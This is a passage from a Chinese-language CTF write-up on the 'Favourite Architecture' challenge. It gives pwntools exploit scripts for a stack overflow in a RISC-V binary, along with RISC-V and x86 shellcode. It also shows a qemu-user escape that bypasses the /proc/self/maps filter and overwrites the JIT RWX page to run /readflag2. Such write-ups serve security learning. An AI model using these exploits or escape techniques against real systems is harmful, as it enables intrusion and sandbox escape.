class="line"></span><br><span class="line">    ecall</span><br><span class="line">    li a0, <span class="number">1</span></span><br><span class="line">    addi a7,a7,<span class="number">1</span></span><br><span class="line">    ecall</span><br></pre></td></tr></table></figure><p>最终的<code>exp</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./main&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([<span class="string">&quot;./qemu-riscv64&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, file_path])</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.28.89.167&#x27;</span>, <span class="number">60001</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stack = <span class="number">0x4000800c70</span></span><br><span class="line">nop = p32(<span class="number">0x00000013</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input the flag: &quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x118</span></span><br><span class="line">payload += p64(stack)*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">shellcode = nop * <span class="number">0xd0</span></span><br><span class="line">shellcode += p32(<span class="number">0x676175b7</span>) + p32(<span class="number">0xc665859b</span>) + p32(<span class="number">0x00b13223</span>)</span><br><span class="line">shellcode += p16(<span class="number">0x004c</span>) + p32(<span class="number">0xf9c00513</span>) + p16(<span class="number">0x4601</span>)</span><br><span class="line">shellcode += p32(<span class="number">0x03800893</span>) + p32(<span class="number">0x00000073</span>) + p16(<span class="number">0x8646</span>)</span><br><span class="line">shellcode += p16(<span class="number">0x089d</span>) + p32(<span class="number">0x00000073</span>) + p16(<span class="number">0x4505</span>) + p16(<span class="number">0x0885</span>) + p32(<span class="number">0x00000073</span>)</span><br><span class="line"></span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里看了大佬的博客，其用到了一种非常稳定的方法做到了任意代码执行，其找到了一段<code>gadget</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00010442</span> <span class="number">93</span> <span class="number">07</span> <span class="number">84</span> ed     addi       a5,s0,<span class="number">-0x128</span></span><br><span class="line"><span class="number">00010446</span> <span class="number">3</span>e <span class="number">85</span>           c.mv       a0,a5</span><br><span class="line"><span class="number">00010448</span> ef <span class="number">60</span> <span class="number">20</span> <span class="number">61</span>     jal        ra,read                                          </span><br></pre></td></tr></table></figure><p>这一段，由于我们可以控制<code>s0,ra</code>寄存器，因此我们可以直接将返回地址覆写为该段代码的起始地址，并将<code>s0</code>设置为<code>bss+0x128</code>这样就可以将<code>a0</code>设置为<code>bss</code>段的地址，就可以向<code>bss</code>中读取任意长度的代码，之后函数返回的时候直接将返回地址设置为<code>bss</code>段的地址，就可以非常稳定的执行代码了，这里不用猜远端的<code>stack</code>地址和添加滑板指令。</p><h2 id="Favourite-Architecure-flag2"><a href="#Favourite-Architecure-flag2" class="headerlink" title="Favourite Architecure flag2"></a>Favourite Architecure flag2</h2><p><code>qemu逃逸</code></p><p>这里第二个<code>flag:/flag</code>是<code>400</code>权限的，也就是只有<code>root</code>用户可以读，或者运行<code>readflag2</code>这个程序，很明显这里我们直接调用<code>readflag2</code>这个程序。但是栈溢出之后我们虽然做到了任意的代码执行，但是程序给出了系统调用的白名单，因此我们需要利用这些系统调用逃逸出<code>qemu</code>，调用<code>readflag2</code>这个程序。</p><p>这里一开始想到的是通过读取<code>/proc/self/maps</code>得到<code>qemu</code>代码段的地址，利用<code>mprotect</code>更改其权限为可写，将<code>patch</code>后的代码改回来，使其可以正常的进行系统调用，但是<code>qemu</code>似乎有特殊的机制，在其内部读取<code>/proc/self/maps</code>的时候只能显示出进程相关的地址，而<code>qmeu</code>的地址无法显示出来，因此无法直接获取得到地址。</p><blockquote><p>这里之后看了<code>clang</code>大佬的博客，<code>qemu</code>这一部分的源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">do_openat</span><span class="params">(<span class="type">void</span> *cpu_env, <span class="type">int</span> dirfd, <span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags, <span class="type">mode_t</span> mode)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">fake_open</span> &#123;</span></span><br><span class="line">     <span class="type">const</span> <span class="type">char</span> *filename;</span><br><span class="line">     <span class="type">int</span> (*fill)(<span class="type">void</span> *cpu_env, <span class="type">int</span> fd);</span><br><span class="line">     <span class="type">int</span> (*cmp)(<span class="type">const</span> <span class="type">char</span> *s1, <span class="type">const</span> <span class="type">char</span> *s2);</span><br><span class="line"> &#125;;</span><br><span class="line"> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">fake_open</span> *<span class="title">fake_open</span>;</span></span><br><span class="line"> <span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">fake_open</span> <span class="title">fakes</span>[] =</span> &#123;</span><br><span class="line">     &#123; <span class="string">&quot;maps&quot;</span>, open_self_maps, is_proc_myself &#125;,</span><br><span class="line">     &#123; <span class="string">&quot;stat&quot;</span>, open_self_stat, is_proc_myself &#125;,</span><br><span class="line">     &#123; <span class="string">&quot;auxv&quot;</span>, open_self_auxv, is_proc_myself &#125;,</span><br><span class="line">     &#123; <span class="string">&quot;cmdline&quot;</span>, open_self_cmdline, is_proc_myself &#125;,</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(HOST_WORDS_BIGENDIAN) != defined(TARGET_WORDS_BIGENDIAN)</span></span><br><span class="line">     &#123; <span class="string">&quot;/proc/net/route&quot;</span>, open_net_route, is_proc &#125;,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">     &#123; <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;</span><br><span class="line"> &#125;;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (is_proc_myself(pathname, <span class="string">&quot;exe&quot;</span>)) &#123;</span><br><span class="line">     <span class="type">int</span> execfd = qemu_getauxval(AT_EXECFD);</span><br><span class="line">     <span class="keyword">return</span> execfd ? execfd : safe_openat(dirfd, exec_path, flags, mode);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (fake_open = fakes; fake_open-&gt;filename; fake_open++) &#123;</span><br><span class="line">     <span class="keyword">if</span> (fake_open-&gt;cmp(pathname, fake_open-&gt;filename)) &#123;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">is_proc_myself</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *entry)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(filename, <span class="string">&quot;/proc/&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;/proc/&quot;</span>))) &#123;</span><br><span class="line">     filename += <span class="built_in">strlen</span>(<span class="string">&quot;/proc/&quot;</span>);</span><br><span class="line">     <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(filename, <span class="string">&quot;self/&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;self/&quot;</span>))) &#123;</span><br><span class="line">         filename += <span class="built_in">strlen</span>(<span class="string">&quot;self/&quot;</span>);</span><br><span class="line">     &#125; <span class="keyword">else</span> <span class="keyword">if</span> (*filename &gt;= <span class="string">&#x27;1&#x27;</span> &amp;&amp; *filename &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">         <span class="type">char</span> myself[<span class="number">80</span>];</span><br><span class="line">         <span class="built_in">snprintf</span>(myself, <span class="keyword">sizeof</span>(myself), <span class="string">&quot;%d/&quot;</span>, getpid());</span><br><span class="line">         <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(filename, myself, <span class="built_in">strlen</span>(myself))) &#123;</span><br><span class="line">             filename += <span class="built_in">strlen</span>(myself);</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(filename, entry)) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看函数逻辑，这里只需要绕过<code>is_proc_myself</code>函数的路径判断即可读取全部的内容，这里采用的是路径是<code>/./proc/self/maps</code>。读取路径完毕之后，即获取了<code>glibc</code>的地址和<code>qemu</code>的基址，选择修改<code>mprotect</code>函数的<code>got</code>表为<code>system</code>。</p><p>这里的方法其实是有点巧妙的。首先是<code>mprotect(ro_mem, len, 6)</code>即将<code>ro_mem</code>这一段修改为可写属性，之后修改<code>mprotect</code>的<code>got</code>表为<code>system</code>，之后修改<code>ro_mem</code>处为<code>/bin/sh</code>，接着再次调用<code>mprotect(ro_mem, len, 6)</code>即可<code>getshell</code>。</p></blockquote><p>大佬的<code>wp</code>思路如下，首先在外部看一下<code>vmmap</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwn@eebb5d553168:/$ <span class="built_in">cat</span> /proc/42/maps</span><br><span class="line">00010000-0006c000 r--p 00000000 00:50 8532122                            /home/pwn/main</span><br><span class="line">0006c000-0006f000 rw-p 0005b000 00:50 8532122                            /home/pwn/main</span><br><span class="line">0006f000-00071000 rw-p 00000000 00:00 0</span><br><span class="line">4000000000-4000001000 ---p 00000000 00:00 0</span><br><span class="line">4000001000-4000801000 rw-p 00000000 00:00 0</span><br><span class="line">562f43f38000-562f443a1000 r-xp 00000000 00:50 8532123                    /home/pwn/qemu-riscv64</span><br><span class="line">562f445a0000-562f445dc000 r--p 00468000 00:50 8532123                    /home/pwn/qemu-riscv64</span><br><span class="line">562f445dc000-562f44608000 rw-p 004a4000 00:50 8532123                    /home/pwn/qemu-riscv64</span><br><span class="line">562f44608000-562f44625000 rw-p 00000000 00:00 0</span><br><span class="line">562f45060000-562f450e6000 rw-p 00000000 00:00 0                          [heap]</span><br><span class="line">7fd134000000-7fd13bfff000 rwxp 00000000 00:00 0</span><br><span class="line">7fd13bfff000-7fd13c000000 ---p 00000000 00:00 0</span><br><span class="line">7fd13c000000-7fd13c021000 rw-p 00000000 00:00 0</span><br></pre></td></tr></table></figure><p>这里我们看到存在一个<code>rwx</code>的段，即代码可执行。应该是<code>qemu JIT Code</code>的部分，我们将<code>shellcode</code>写入此处，使得<code>qemu</code>执行这一部分的代码。这里和之前的<code>mmap</code>爆破类似，这里我们利用<code>mprotect</code>来爆破得到<code>rwx</code>段的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">test_map</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> va = <span class="number">0x7f0000000000</span>;</span><br><span class="line">    <span class="type">size_t</span> inc = <span class="number">0x000004000000</span>; </span><br><span class="line">    <span class="type">int</span> res;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="comment">// 这里添加+0x4000即offset的原因是防止破坏原本的jit code</span></span><br><span class="line">        res = mprotect(va+<span class="number">0x4000</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE|PROT_EXEC);</span><br><span class="line">        <span class="keyword">if</span> (res &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;find: %lx\n&quot;</span>, va);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        va += inc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> va;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之所以起始地址设置为<code>va+0x4000</code>是要避开<code>qemu</code>本身的<code>JIT Code</code>。在得到<code>rwx</code>段的地址我们将<code>shellcode</code>写入<code>JIT Code</code>的部分。<code>shellcode</code>是打印出<code>here</code>字符串。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">breakpoint</span><span class="params">()</span> &#123;</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo here shellcode</span></span><br><span class="line"><span class="type">char</span> sc[] = &#123;<span class="number">0x68</span>, <span class="number">0x68</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x6a</span>, <span class="number">0x1</span>, <span class="number">0x58</span>, <span class="number">0x6a</span>, <span class="number">0x1</span>, <span class="number">0x5f</span>, <span class="number">0x6a</span>, <span class="number">0x4</span>, <span class="number">0x5a</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0xf</span>, <span class="number">0x5</span>, <span class="number">0x5d</span>, <span class="number">0x5d</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * VA;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">test_map</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> va = <span class="number">0x7f0000000000</span>;</span><br><span class="line">    <span class="type">size_t</span> inc = <span class="number">0x000004000000</span>;</span><br><span class="line">    <span class="type">int</span> res;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        res = mprotect(va+<span class="number">0x4000</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE|PROT_EXEC);</span><br><span class="line">        <span class="keyword">if</span> (res &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;find: %lx\n&quot;</span>, va);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        va += inc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> va;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line">    <span class="type">char</span> *addr;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0x90</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf+<span class="number">0x10</span>, sc, <span class="built_in">strlen</span>(sc));</span><br><span class="line">    addr = (<span class="type">char</span> *)test_map();</span><br><span class="line">    fflush(<span class="number">0</span>);</span><br><span class="line">    breakpoint();</span><br><span class="line">    <span class="built_in">memcpy</span>(addr, sc, <span class="built_in">strlen</span>(sc));</span><br><span class="line">    <span class="comment">// memset(addr, 0xcc, 100);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后我们编译这段代码，用<code>qemu</code>执行一下。</p><h3 id="riscv交叉编译环境搭建"><a href="#riscv交叉编译环境搭建" class="headerlink" title="riscv交叉编译环境搭建"></a>riscv交叉编译环境搭建</h3><p>这里按照<code>github</code>上编译出来的二进制程序存在一定的问题，当我们编译上述代码的时候会报错<code>sys/mman.h</code>找不到。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install git build-essential gdb-multiarch gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu</span><br></pre></td></tr></table></figure><p>静态编译上述的代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">riscv64-linux-gnu-gcc -static brute_test.c -o brute_test</span><br></pre></td></tr></table></figure><p>使用<code>qemu</code>运行编译好的静态程序。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@1c877093faab:~/work/2020starctf/favourite_architecture<span class="comment"># ./qemu-riscv64 brute_test</span></span><br><span class="line">[!] 80 bad system call</span><br><span class="line">find: 7fc23c000000</span><br><span class="line">[!] 80 bad system call</span><br><span class="line"></span><br><span class="line">hereSegmentation fault</span><br></pre></td></tr></table></figure><p>可以看到成功打印出了<code>here</code>字符串，但是这里有一个问题，就是<code>memcpy</code>虽然拷贝的是<code>sc</code>数组中值，但是如果我们将<code>buf</code>删除或者将<code>sc</code>拷贝到<code>buf</code>中的语句删掉执行就不会成功，不知道是什么问题。</p><p>这里执行成功之后，我们就可以将<code>shellcode</code>直接覆写到<code>jit code page</code>中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"># riscv64-linux-gnu-as orw_flag2.asm -o orw_flag2</span><br><span class="line"># riscv64-linux-gnu-objcopy -S -O binary -j .text orw_flag2 orw_flag2.bin</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">li a3, 0x7f0000000000 # base</span><br><span class="line">li a4, 0x000004000000 # inc</span><br><span class="line">li a5, 0xf000 # offset</span><br><span class="line">loop:</span><br><span class="line">add a0, a3, a5 </span><br><span class="line">li a1, 0x1000</span><br><span class="line">li a2, 7</span><br><span class="line">li a7, 226 # mprotect</span><br><span class="line">ecall</span><br><span class="line"></span><br><span class="line">beq a0, zero, succ </span><br><span class="line">add a3, a3, a4 </span><br><span class="line">j loop </span><br><span class="line"></span><br><span class="line">succ:</span><br><span class="line"># try output a3</span><br><span class="line">li a1, 0x6f200</span><br><span class="line">sd a3, 0(a1)</span><br><span class="line">li a0, 1</span><br><span class="line">li a2, 0x10</span><br><span class="line">li a7, 64 # write</span><br><span class="line">ecall</span><br><span class="line"># rwx page at a3</span><br><span class="line"># read(0, a3, 0x200)</span><br><span class="line">li a0, 0</span><br><span class="line">li a1, 0x6f200 # x86 sc buf</span><br><span class="line">li a2, 0x200</span><br><span class="line"></span><br><span class="line">li a7, 63 # read</span><br><span class="line">ecall </span><br><span class="line"></span><br><span class="line"># copy from 0x70000 to a3</span><br><span class="line">addi a3, a3, 0x200 #22c</span><br><span class="line">addi a1, a1, 0x200</span><br><span class="line">li a2, 0x80</span><br><span class="line">copy:</span><br><span class="line">ld a5, 0(a1)</span><br><span class="line">sd a5, 0(a3)</span><br><span class="line">addi a1, a1, -4 </span><br><span class="line">addi a3, a3, -4 </span><br><span class="line">beq a2, zero,  finish</span><br><span class="line">addi a2, a2, -1 </span><br><span class="line">j copy</span><br><span class="line"></span><br><span class="line">finish:</span><br><span class="line">li a7, 93 # exit</span><br><span class="line">ecall</span><br></pre></td></tr></table></figure><p>这段<code>shellcode</code>的作用就是爆破出<code>jit code page address</code>之后，调用<code>read</code>读取我们输入的<code>execve(&quot;/readflag2&quot;) x86 shellcode</code>到<code>bss</code>段中，之后将其拷贝到<code>jit code page</code>中。完成之后即可调用我们输入的<code>x86 shellcode</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./main&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([<span class="string">&quot;./qemu-riscv64&quot;</span>, file_path])</span><br><span class="line">    <span class="comment"># p = process([&quot;./qemu-riscv64&quot;, &quot;-g&quot;, &quot;1234&quot;, file_path])</span></span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># p = remote(&#x27;119.28.89.167&#x27;, 60001)</span></span><br><span class="line">    p = remote(<span class="string">&#x27;172.22.0.1&#x27;</span>, <span class="number">60001</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x0006edb0</span></span><br><span class="line">call_read = <span class="number">0x00010442</span></span><br><span class="line">nop = p32(<span class="number">0x00000013</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input the flag: &quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x118</span> + p64(bss + <span class="number">0x128</span>) + p64(call_read)</span><br><span class="line">payload += cyclic(<span class="number">0x1f8</span>) + p64(bss)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="built_in">open</span>(<span class="string">&quot;orw_flag2.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;You are wrong ._.\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;You are wrong ._.\n&quot;</span>)</span><br><span class="line">jit_code_address = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">&quot;jit code address is 